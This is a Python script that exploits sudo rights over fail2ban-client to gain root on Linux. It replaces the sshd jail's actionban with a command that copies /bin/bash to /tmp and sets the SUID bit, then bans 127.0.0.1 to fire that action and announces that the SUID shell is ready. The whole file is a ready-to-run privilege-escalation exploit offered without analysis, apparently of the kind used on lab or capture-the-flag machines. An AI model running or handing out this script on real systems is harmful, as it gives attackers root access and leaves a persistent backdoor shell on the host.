import subprocess
import sys
import shutil
import platform

def is_sudo_accessible() -> bool:
    """Check if the user can run fail2ban-client with sudo without a password prompt."""
    if shutil.which("fail2ban-client") is None:
        print("fail2ban-client is not installed or not in PATH.")
        return False
    try:
        result = subprocess.run(
            ['sudo', '-n', 'fail2ban-client', 'status'],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        if result.returncode == 0:
            return True
        print("You do not have the necessary permissions to run fail2ban-client with sudo.")
        return False
    except Exception as e:
        print(f"Unexpected error while checking sudo access: {e}")
        return False

def run_command(command: list[str]) -> None:
    """Run a shell command as a list of arguments."""
    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode != 0:
            print(f"Error running command: {' '.join(command)}")
            print(result.stderr.decode())
        else:
            print(result.stdout.decode())
    except Exception as e:
        print(f"An error occurred while running command: {e}")

def main() -> None:
    if platform.system() != 'Linux':
        print("This script is designed to run on a Linux system.")
        sys.exit(1)

    if not is_sudo_accessible():
        sys.exit(1)

    print("Restarting fail2ban...")
    run_command(["sudo", "fail2ban-client", "restart"])

    print("Setting actionban for SSHD to copy bash to /tmp and set SUID bit...")
    action_command = (
        "cp /bin/bash /tmp && chmod 4755 /tmp/bash"
    )
    run_command([
        "sudo", "fail2ban-client", "set", "sshd", "action", "iptables-multiport", "actionban",
        f"/bin/bash -c '{action_command}'"
    ])

    print("Banning IP 127.0.0.1 to trigger the action...")
    run_command(["sudo", "fail2ban-client", "set", "sshd", "banip", "127.0.0.1"])

    print("âœ… Done. You can now run /tmp/bash with SUID.")

if __name__ == "__main__":
    main()